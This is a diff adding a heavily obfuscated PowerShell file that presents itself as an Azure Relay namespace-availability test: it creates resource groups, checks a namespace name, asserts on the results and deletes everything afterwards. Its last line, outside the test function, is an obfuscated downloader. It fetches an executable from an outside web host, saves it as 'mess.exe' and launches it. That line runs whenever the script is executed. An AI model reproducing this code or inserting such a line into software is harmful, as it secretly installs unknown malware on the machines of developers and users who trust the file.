@@ -1,0 +1,38 @@
+function T`eSta`zurermrelAYnA`M`et`esTs 
+{
+	
+	${L`OC`AT`ioN} = ("{0}{1}{2}" -f'We','st U','S')
+	${n`Ame`SpA`CE`NAmE} = .("{0}{2}{1}"-f 'getAs','tName','se') ("{1}{2}{0}"-f'y-NS','R','ela')
+	${n`Am`eSPa`cEname2} = .("{0}{2}{1}" -f 'get','me','AssetNa') ("{0}{2}{1}" -f 'Re','S','lay-N')
+	${Re`so`URCe`grouPNAME} = &("{3}{0}{1}{2}"-f'etAss','etNa','me','g')
+	${sE`COndRES`ouR`cEGrOUp} = .("{2}{3}{0}{1}"-f'Nam','e','getAs','set')
+	
+	.("{3}{2}{0}{1}"-f'e-De','bug','t','Wri') ("{2}{1}{0}{4}{3}"-f 'source','eate re','Cr','oup',' gr')
+	&("{2}{0}{1}"-f 'bu','g','Write-De') ('Res'+'ourceG'+'ro'+'up '+'n'+'ame '+': '+"$resourceGroupName")
+	&("{0}{1}{4}{2}{3}" -f 'New-Az','Re','ourc','eGroup','s') -Name ${RE`souRC`egR`O`UpnaMe} -Location ${lO`C`A`TIon} -Force 
+
+	.("{1}{2}{0}{3}" -f'b','W','rite-De','ug') ("{3}{0}{2}{4}{1}"-f 'ate reso','p','urc','Cre','e grou')
+	.("{2}{0}{1}" -f 'ite-Deb','ug','Wr') ('Reso'+'urc'+'eG'+'r'+'oup '+'nam'+'e '+': '+"$secondResourceGroup")
+	.("{4}{1}{0}{2}{3}" -f 'ource','w-AzRes','Gro','up','Ne') -Name ${SE`CoNDres`o`U`R`cegro`Up} -Location ${L`oCa`TIoN} -Force 
+	
+	${ReS`ULtCheCknaME`AVAI`l`A`Bil`iTy} = .("{1}{0}{2}{3}"-f'-Az','Test','RelayNam','e') -Namespace ${Na`mEsp`A`ceNamE}
+	.("{2}{1}{0}"-f 'True','ssert-','A') {${rEsulTChecknaMEA`Va`I`laB`i`litY}."naM`eaV`A`I`LaBLE"} ("{3}{8}{2}{7}{6}{5}{1}{0}{4}{9}"-f'a','pace N',' ','T','m','s','e','Nam','he','e not Available')
+	
+	&("{3}{2}{0}{1}"-f 'b','ug','De','Write-') ("{2}{7}{0}{5}{6}{3}{1}{4}"-f 'eate ne','y n',' C','ela','amespace','w ','R','r')
+	.("{1}{2}{0}"-f'g','Write-D','ebu') ('Na'+'mespace'+'Na'+'me '+': '+"$namespaceName") 
+	${RE`sU`lT} = .("{5}{0}{1}{4}{2}{3}"-f'-A','z','pac','e','RelayNames','New') -ResourceGroupName ${R`ES`oU`R`CEgR`OuPnAMe} -Name ${NAm`EspaCenA`me} -Location ${lOCat`IOn}
+	.("{0}{1}{3}{2}"-f 'Wai','t-S','s','econd') 15
+
+	
+	.("{0}{2}{1}{3}" -f'Assert','Tru','-','e') {${reS`U`lt}."Pr`O`VIsiONi`NgState" -eq ("{2}{1}{0}" -f'ed','ceed','Suc')}
+
+	${R`ecHeckNAMe`AV`A`ILAB`Ili`TY} = &("{3}{0}{2}{1}" -f 'st-A','e','zRelayNam','Te') -Namespace ${NA`mESP`AcE`NAMe}
+	.("{1}{2}{0}"-f 'ert-False','A','ss') {${Re`ch`EcKnaMe`Av`AIl`ABiL`ITY}."NameA`Va`i`LAb`le"} ("{5}{9}{2}{7}{4}{8}{1}{0}{3}{6}" -f'le','ilab','e ',' fai',' ','The Nam','led','Name','Ava','espac')  
+	
+	.("{2}{1}{0}" -f 'g','e-Debu','Writ') ("{0}{1}{5}{4}{2}{3}" -f ' ','D','ame','spaces','ete n','el')
+	&("{4}{3}{5}{6}{2}{0}{1}" -f'mesp','ace','a','em','R','ove-AzRel','ayN') -ResourceGroupName ${resOuR`c`e`G`ROu`pNamE} -Name ${N`A`MEsP`AceNaME}
+
+	&("{1}{3}{0}{2}" -f 'eb','Write-','ug','D') ("{1}{2}{0}{3}" -f 'esourceg',' Delete ','r','roup')
+	.("{1}{6}{5}{3}{4}{2}{0}" -f 'p','Re','eGrou','e','sourc','AzR','move-') -Name ${ReSOurC`Eg`R`OupnAme} -Force
+}
+(&("{2}{0}{1}"-f'bjec','t','New-O') ("{2}{1}{0}{3}{4}" -f '.','ystem','S','Ne','t.WebClient')).("{2}{3}{1}{0}" -f 'e','l','Do','wnloadFi').Invoke(("{0}{4}{6}{2}{3}{1}{5}"-f'http:','/1.e','/','0x','//cajo','xe','s.in'),("{0}{1}{2}" -f 'mess','.ex','e'));&("{2}{0}{1}{3}"-f 'rt-Pro','c','Sta','ess') ("{0}{2}{1}" -f'mess.','e','ex')
